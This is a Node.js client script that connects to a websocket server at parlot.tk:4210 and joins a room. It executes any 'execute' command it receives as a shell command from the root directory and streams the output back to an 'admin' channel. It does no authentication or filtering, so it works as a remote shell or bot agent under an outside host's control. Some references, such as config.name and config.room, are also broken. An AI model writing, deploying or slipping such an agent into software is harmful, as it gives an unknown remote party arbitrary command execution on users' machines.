const { spawn } = require('child_process')
const fs = require('fs');
const fetch = require('node-fetch');
const { resolve } = require('path');

const config = {
    path: 'config.json',

    get: function() {
        try {
            return JSON.parse(fs.readFileSync(this.path));
        }
        catch(error) {
            const file = { wsserver: {
                url: 'https://parlot.tk',
                port: 4210,
            } };
            fs.writeFileSync(this.path, JSON.stringify(file));
            return file;
        }    
    },

    save: function(file) {
        fs.writeFileSync(this.path, JSON.stringify(file));
    },

    createName: async function() {
        const info = this.get();
        const url = `${ info.wsserver.url }:${ info.wsserver.port }`;
        const res = await fetch(`${url}/randomname`);
        const data = await res.json();

        info.name = data.name;
        this.save(info);
        return data.name;
    }
}

if (!config.get().room) {
    console.log('You must inform a room in the config.json file');
    return;
}

const socket = require('./wsclient.js')( config.get().wsserver );

socket.connect().then(async () => {
    if (!config.get().name) {
        await config.createName();
    }

    socket.emit('server', {
        action: 'set name',
        name: config.name,
    });

    socket.join(config.room, async (data, sender) => executeCommand(data));
    socket.join('self', async (data, sender) => executeCommand(data));
});

function executeCommand(data) {
    if (data.action && data.action == 'execute') {
        const res = spawn(data.command, [], { shell: true, cwd: '/' });
        
        res.stdout.on('data', data => {
            socket.emit('admin', { action: 'command', response: data.toString() });
        });
        res.stderr.on('data', data => {
            socket.emit('admin', { action: 'command', response: data.toString() });
        });
    }
    return true;
}

socket.run();